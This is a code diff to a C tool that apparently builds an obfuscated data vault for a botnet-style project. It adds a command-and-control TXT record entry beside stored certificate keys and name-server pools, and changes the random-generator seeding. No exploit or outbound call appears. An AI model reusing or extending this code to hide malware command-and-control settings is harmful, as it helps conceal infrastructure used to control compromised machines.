@@ -2,6 +2,7 @@
 #include "dvault.h"
 #include "util_rt.h"
 #include "imap.h"
+#include "resolv.h"
 #include "proone_conf/x509.h"
 
 #include <stdio.h>
@@ -63,7 +64,7 @@ static void assert_errno (const bool expr, const char *msg) {
 }
 
 static void assert_dvault (
-	const prne_dvault_mask_result_t *ret, 
+	const prne_dvault_mask_result_t *ret,
 	prne_data_key_t key)
 {
 	if (ret->result != PRNE_DVAULT_MASK_OK) {
@@ -130,8 +131,8 @@ int main (void) {
 		&rnd,
 		mbedtls_entropy_func,
 		&ent,
-		(unsigned char*)PRNE_BUILD_ENTROPY,
-		sizeof(PRNE_BUILD_ENTROPY));
+		NULL,
+		0);
 	assert_mbedtls(callret == 0, callret, "mbedtls_ctr_drbg_seed()");
 
 	gen_mask(mask);
@@ -149,6 +150,7 @@ int main (void) {
 	add_bin(PRNE_DATA_KEY_X509_C_KEY, PRNE_X509_C_KEY);
 	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV4, PRNE_RESOLV_NS_POOL_IPV4);
 	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV6, PRNE_RESOLV_NS_POOL_IPV6);
+	add_cstr(PRNE_DATA_KEY_CNC_TXT_REC, PRNE_CNC_TXT_REC);
 
 	pos += NB_PRNE_DATA_KEY * sizeof(uint16_t);
 
@@ -156,7 +158,7 @@ int main (void) {
 	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
 		uint8_t salt;
 		const size_t avail = UINT16_MAX - pos;
-		
+
 		assert_plain(ENTRIES[i].set, "Null entry found.");
 
 		callret = mbedtls_ctr_drbg_random(&rnd, &salt, 1);
@@ -184,7 +186,7 @@ int main (void) {
 	memcpy(ptr, mask, 256);
 	ptr += 256;
 	ptr_offsets = ptr;
-	
+
 	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
 		ptr[0] = (uint8_t)((ENTRIES[i].pos & 0xFF00) >> 8);
 		ptr[1] = (uint8_t)((ENTRIES[i].pos & 0x00FF) >> 0);
@@ -209,10 +211,10 @@ int main (void) {
 	memcpy(m_test, m_out, pos);
 	for (size_t i = 0; i < 3; i += 1) {
 		prne_init_dvault(m_test);
-		
+
 		for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
 			size_t size;
-			
+
 			switch (ENTRIES[i].type) {
 			case PRNE_DATA_TYPE_BIN:
 				ptr_rd = prne_dvault_get_bin(i, &size);
